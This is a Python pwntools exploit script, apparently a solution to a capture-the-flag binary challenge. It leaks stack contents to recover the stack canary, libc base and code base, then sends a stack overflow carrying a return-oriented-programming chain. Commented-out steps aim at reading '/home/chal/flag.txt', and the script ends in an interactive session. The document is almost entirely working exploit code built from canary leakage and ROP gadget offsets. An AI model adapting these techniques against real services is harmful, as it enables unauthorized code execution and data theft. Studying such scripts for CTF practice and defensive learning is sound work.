from pwn import *

r = process('./chal')
# r = remote('10.113.184.121', 10056)
context.arch = 'amd64'

def init_and_leak_info():
    # Try to trigger length exploit
    payload = b'a' * 20
    r.sendafter(b"Haaton's name? ", payload)
    print(r.recvlines(2))

    # Try to leak stack info
    payload = b'HACHAMA'.ljust(0x8, b'\x00')
    # raw_input()
    r.send(payload)
    result = r.recv(0x61)
    log.info("[-------------Stack Info-------------]")
    for i in range(12):
        log.info(hex(u64(result[i * 8:i * 8 + 8])))
    log.info("[-------------Stack Info-------------]")

    canary = u64(result[7 * 8:7 * 8 + 8])
    libc_start_main = u64(result[9 * 8:9 * 8 + 8]) - 0x80
    libc_base_addr = libc_start_main - 0x29d90 + 0x80
    main_fn_addr = u64(result[11 * 8:11 * 8 + 8])
    code_segment_base = main_fn_addr - 0x331

    log.success(f'Canary = {hex(canary)}')
    log.success(f'libc start main base = {hex(libc_start_main)}')
    log.success(f'libc base addr = {hex(libc_base_addr)}')
    log.success(f'Main Function Address = {hex(main_fn_addr)}')
    log.success(f'Code Segment = {hex(code_segment_base)}')

    return canary, code_segment_base, main_fn_addr, libc_base_addr

# Try to open flag file
canary, code_segment_base, main_fn_addr, libc_base_addr = init_and_leak_info()
bss_addr_open = code_segment_base + 0x3000 + 0xc00
bss_addr_read = code_segment_base + 0x3000 + 0xd00
bss_addr_write = code_segment_base + 0x3000 + 0xe00
payload = flat(
    canary,
    bss_addr_open,
    main_fn_addr + 291
)
# raw_input()
r.send(b'HAHAHA'.ljust(0x8, b'\x00') + b'a' * 48 + payload)

raw_input()
pop_rax_ret = libc_base_addr + 0x0000000000045eb0# : pop rax ; ret
pop_rdi_ret = libc_base_addr + 0x000000000002a3e5# : pop rdi ; ret
pop_rsi_ret = libc_base_addr + 0x000000000002be51# : pop rsi ; ret
pop_rdx_ret = libc_base_addr + 0x00000000000796a2# : pop rdx ; ret
bin_sh = libc_base_addr + 0x00000000001d8698
syscall_ret = libc_base_addr + 0x0000000000091316# : syscall ; ret
mov_qword_ptr_rdi_rdx_ret = libc_base_addr + 0x00000000000bfc63# : mov qword ptr [rdi], rdx ; ret
n2_addr = code_segment_base + 0x3180
extend_payload = flat(
    canary,
    bss_addr_read,
    pop_rdi_ret, n2_addr,
    # pop_rdx_ret, 0x1000,
    mov_qword_ptr_rdi_rdx_ret,
    main_fn_addr + 291,

    # pop_rax_ret, 2,
    # pop_rdi_ret, bss_addr_open - 0x40,
    # pop_rdx_ret, 0,
    # pop_rsi_ret, 0,
    # syscall_ret,
    # main_fn_addr + 291
)
file_addr = b'/home/chal/flag.txt'.ljust(0x38, b'\x00')
r.send(file_addr + extend_payload)
r.interactive()